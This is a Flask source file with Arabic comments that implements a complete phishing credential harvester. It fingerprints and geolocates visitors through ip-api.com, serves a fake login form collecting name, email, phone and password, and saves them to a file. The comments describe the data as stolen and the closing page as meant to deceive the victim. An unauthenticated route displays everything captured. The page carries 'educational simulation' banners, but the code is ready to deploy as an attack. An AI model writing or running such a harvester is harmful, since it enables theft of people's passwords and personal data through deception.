from flask import Flask, request, redirect, render_template_string, url_for
import datetime
import os
import requests

app = Flask(__name__)

# ========== الصفحة الرئيسية (وجهة الضحية) ==========
@app.route('/')
def index():
    # 1. جمع البيانات التقنية فوراً
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    accept_lang = request.headers.get('Accept-Language')
    
    # تخمين نظام التشغيل
    os_info = "غير معروف"
    if "Android" in user_agent:
        os_info = "📱 Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "📱 iOS"
    elif "Windows" in user_agent:
        os_info = "💻 Windows"
    elif "Mac" in user_agent:
        os_info = "🍎 Mac"
    
    # جلب الموقع التقريبي
    try:
        ip_response = requests.get(f'http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp')
        ip_data = ip_response.json()
        if ip_data['status'] == 'success':
            location = f"{ip_data.get('city', 'غير معروف')}, {ip_data.get('country', 'غير معروف')}"
            isp = ip_data.get('isp', 'غير معروف')
        else:
            location, isp = "غير متاح", "غير متاح"
    except:
        location, isp = "خطأ في الجلب", "خطأ في الجلب"
    
    # تسجيل البيانات التقنية
    log_entry = f"""
    ═══════════════════════════════════════════
    [زيارة جديدة] - {datetime.datetime.now()}
    🌐 IP: {client_ip}
    📍 الموقع التقريبي: {location}
    📡 مزود الخدمة: {isp}
    📱 نظام التشغيل: {os_info}
    🌍 اللغة: {accept_lang}
    📝 User-Agent: {user_agent}
    ═══════════════════════════════════════════
    """
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    # 2. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
    return redirect('/login')

# ========== صفحة تسجيل الدخول الوهمية ==========
login_page_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>تسجيل الدخول - تجربة تعليمية</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
        h2 { color: #1a73e8; text-align: center; }
        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ffc107; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
        .field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 تسجيل الدخول</h2>
        <div class="warning">
            ⚠️ هذه صفحة تعليمية لمحاكاة هجوم التصيد (Phishing)<br>
            سيتم تسجيل البيانات التي تدخلها لأغراض التعلم فقط
        </div>
        <form action="/capture" method="POST">
            <div class="field">
                <label>الاسم الكامل</label>
                <input type="text" name="fullname" placeholder="أدخل اسمك الكامل" required>
            </div>
            <div class="field">
                <label>البريد الإلكتروني</label>
                <input type="email" name="email" placeholder="example@email.com" required>
            </div>
            <div class="field">
                <label>رقم الهاتف</label>
                <input type="tel" name="phone" placeholder="05xxxxxxxx" required>
            </div>
            <div class="field">
                <label>كلمة المرور</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            🔒 هذه تجربة تعليمية على خادم آمن
        </div>
    </div>
</body>
</html>
'''

@app.route('/login')
def fake_login():
    return render_template_string(login_page_html)

# ========== مسار استقبال البيانات المسجلة ==========
@app.route('/capture', methods=['POST'])
def capture():
    fullname = request.form.get('fullname')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # تسجيل البيانات المسروقة
    with open('captured_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📥 بيانات تم جمعها - {datetime.datetime.now()}
        👤 الاسم الكامل: {fullname}
        📧 البريد الإلكتروني: {email}
        📱 رقم الهاتف: {phone}
        🔑 كلمة المرور: {password}
        🌐 IP المصدر: {request.remote_addr}
        📱 User-Agent: {request.headers.get('User-Agent')}
        ═══════════════════════════════════════════
        """)
    
    # عرض صفحة شكر لإيهام الضحية
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>تم تسجيل الدخول</title></head>
    <body style="font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f0f2f5;">
        <div style="background: white; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px;">
            <h2 style="color: #28a745;">✅ تم تسجيل الدخول بنجاح!</h2>
            <p>سيتم توجيهك إلى لوحة التحكم...</p>
            <div style="background: #fff3cd; padding: 15px; border-radius: 5px; color: #856404; margin-top: 20px; font-size: 14px;">
                ⚠️ هذه تجربة تعليمية. بياناتك تم تسجيلها في الخادم
            </div>
        </div>
        <script>setTimeout(() => { window.location.href = 'https://www.google.com'; }, 3000);</script>
    </body>
    </html>
    '''

# ========== عرض السجلات (للمختبر) ==========
@app.route('/view-logs')
def view_logs():
    output = "<html><head><title>السجلات</title><style>body{background:#1e1e1e;color:#d4d4d4;padding:20px;font-family:monospace;}</style></head><body>"
    try:
        with open('log.txt', 'r', encoding='utf-8') as f:
            output += "<h2>📊 السجلات التقنية</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد سجلات تقنية</p>"
    try:
        with open('captured_data.txt', 'r', encoding='utf-8') as f:
            output += "<h2>🔐 البيانات المسجلة</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد بيانات مسجلة</p>"
    output += "</body></html>"
    return output

# ========== تشغيل الخادم ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
